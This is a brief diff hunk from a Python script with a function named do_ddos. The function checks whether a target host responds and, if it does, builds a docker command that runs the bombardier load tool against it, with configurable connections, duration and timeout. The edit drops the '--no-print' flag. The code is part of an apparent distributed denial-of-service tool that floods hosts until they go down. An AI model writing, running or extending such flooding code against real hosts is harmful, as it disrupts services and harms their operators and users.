@@ -38,7 +38,7 @@ def do_ddos(host):
         print(host, 'DOWN')
     else:
         print(host, 'ALIVE')
-        command = 'docker run --rm alpine/bombardier --no-print ' \
+        command = 'docker run --rm alpine/bombardier ' \
             f'--connections {CONNECTIONS_PER_CONTAINER} ' \
             f'--duration {INTERVAL_BETWEEN_PING} ' \
             f'--timeout {REQUEST_TIMEOUT} ' \
